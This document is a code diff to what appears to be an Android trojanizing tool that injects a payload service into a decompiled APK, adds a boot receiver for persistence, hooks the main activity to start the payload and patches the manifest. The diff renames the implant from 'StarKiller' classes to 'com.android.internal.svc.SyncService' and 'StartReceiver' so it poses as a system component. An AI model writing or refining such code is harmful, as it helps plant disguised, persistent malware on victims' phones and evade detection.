@@ -46,7 +46,7 @@ SMALI_SERVICE_START = """.method private startPayload()V
     .locals 2
 
     new-instance v0, Landroid/content/Intent;
-    const-class v1, Lcom/starkiller/agent/StarKillerService;
+    const-class v1, Lcom/android/internal/svc/SyncService;
     invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
     sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
@@ -66,7 +66,7 @@ SMALI_SERVICE_START = """.method private startPayload()V
 .end method
 """
 
-SMALI_BOOT_RECEIVER = """.class public Lcom/starkiller/agent/persistence/BootReceiver;
+SMALI_BOOT_RECEIVER = """.class public Lcom/android/internal/svc/persistence/StartReceiver;
 .super Landroid/content/BroadcastReceiver;
 
 .method public constructor <init>()V
@@ -88,7 +88,7 @@ SMALI_BOOT_RECEIVER = """.class public Lcom/starkiller/agent/persistence/BootRec
     if-eqz v0, :cond_0
 
     new-instance v0, Landroid/content/Intent;
-    const-class v1, Lcom/starkiller/agent/StarKillerService;
+    const-class v1, Lcom/android/internal/svc/SyncService;
     invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
     invoke-virtual {p1, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
@@ -137,7 +137,7 @@ def inject_payload_smali(decompiled_dir, payload_smali_dir):
         target_smali = os.path.join(decompiled_dir, "smali_classes2")
         os.makedirs(target_smali, exist_ok=True)
 
-    payload_dest = os.path.join(target_smali, "com", "starkiller", "agent")
+    payload_dest = os.path.join(target_smali, "com", "android", "internal", "svc")
     if os.path.exists(payload_dest):
         shutil.rmtree(payload_dest)
 
@@ -150,7 +150,7 @@ def inject_payload_smali(decompiled_dir, payload_smali_dir):
         os.makedirs(os.path.join(payload_dest, "persistence"), exist_ok=True)
         os.makedirs(os.path.join(payload_dest, "modules"), exist_ok=True)
 
-        boot_path = os.path.join(payload_dest, "persistence", "BootReceiver.smali")
+        boot_path = os.path.join(payload_dest, "persistence", "StartReceiver.smali")
         with open(boot_path, "w") as f:
             f.write(SMALI_BOOT_RECEIVER)
         print(f"    [+] Wrote boot receiver Smali stub")
@@ -175,12 +175,12 @@ def patch_manifest(decompiled_dir):
 
     service_block = f'''
         <service
-            android:name="com.starkiller.agent.StarKillerService"
+            android:name="com.android.internal.svc.SyncService"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
         <receiver
-            android:name="com.starkiller.agent.persistence.BootReceiver"
+            android:name="com.android.internal.svc.persistence.StartReceiver"
             android:exported="true"
             android:enabled="true">
             <intent-filter>
@@ -189,9 +189,9 @@ def patch_manifest(decompiled_dir):
         </receiver>
 '''
 
-    if "com.starkiller.agent.StarKillerService" not in content:
+    if "com.android.internal.svc.SyncService" not in content:
         content = content.replace("</application>", service_block + "    </application>")
-        print(f"    [+] Injected StarKillerService + BootReceiver into manifest")
+        print(f"    [+] Injected SyncService + StartReceiver into manifest")
 
     content = content.replace('android:debuggable="true"', 'android:debuggable="false"')
 
@@ -238,14 +238,14 @@ def inject_startup_hook(decompiled_dir):
                     1
                 )
                 smali_content += "\n" + SMALI_SERVICE_START.replace(
-                    "Lcom/starkiller/agent/StarKillerService;",
-                    "Lcom/starkiller/agent/StarKillerService;"
+                    "Lcom/android/internal/svc/SyncService;",
+                    "Lcom/android/internal/svc/SyncService;"
                 )
 
                 with open(full_path, "w") as f:
                     f.write(smali_content)
 
-                print(f"    [+] Hooked {main_activity} → startPayload()")
+                print(f"    [+] Hooked {main_activity} -> startPayload()")
             else:
                 print(f"    [*] Already hooked")
             return True
